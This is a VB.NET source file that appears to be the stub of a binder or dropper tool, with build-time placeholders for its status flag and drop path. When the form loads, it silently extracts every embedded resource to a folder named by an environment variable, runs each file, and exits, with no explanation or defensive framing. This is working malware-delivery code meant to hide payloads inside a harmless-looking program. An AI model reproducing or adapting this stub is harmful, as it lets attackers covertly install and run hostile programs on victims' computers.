Imports System.Reflection
Imports System.IO
Imports System.IO.Compression

Public Class Form1
    Public status As Boolean = Boolean.Parse("[BinderStatus]")
    Public dpath As String = "[DropperPath]"
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim t As New Threading.Thread(AddressOf RunDropper)
        t.IsBackground = True
        t.Start()
    End Sub
    Public Sub RunDropper()
        If (status = True) Then
            If (WriteResourceToFile()) Then
                Application.Exit()
            End If
        End If
    End Sub
    Private Function WriteResourceToFile() As Boolean
        Dim res() As String = Assembly.GetExecutingAssembly().GetManifestResourceNames

        For Each name As String In res
            Using resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(name)
                If Not (name.Contains("resources") Or name.Contains("Resources.resources")) Then
                    Using file = New FileStream(Path.Combine(Environ(dpath), name), FileMode.Create, FileAccess.Write)

                        resource.CopyTo(file)

                    End Using

                    Process.Start(Path.Combine(Environ(dpath), name))

                End If
            End Using
        Next
        Return True
    End Function
End Class
